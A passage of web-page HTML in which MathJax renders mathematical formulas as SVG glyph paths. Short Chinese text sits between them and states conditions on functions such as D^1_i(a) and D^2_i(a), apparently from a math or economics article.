60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(4238.2,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5502.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5891.8,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(6420.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6809.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></g></svg></mjx-container></p><p>当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="19.933ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 8810.2 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1264.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1653.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2182.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2849.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msubsup" transform="translate(3905.1,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5169.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5558.7,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(6087.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6754.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(7810.2,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g></g></g></svg></mjx-container>时，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="25.009ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 11053.8 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(965.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2021.5,0)"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"></path></g><g data-mml-node="mo" transform="translate(2854.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(3243.5,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4508.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4897.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(5426.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5815.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(6259.7,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7524.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7913.3,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(8442.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8831.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9498.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(10553.8,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container></p><p>当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="19.933ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 8810.2 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1264.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1653.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2182.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2849.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msubsup" transform="translate(3905.1,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5169.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5558.7,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 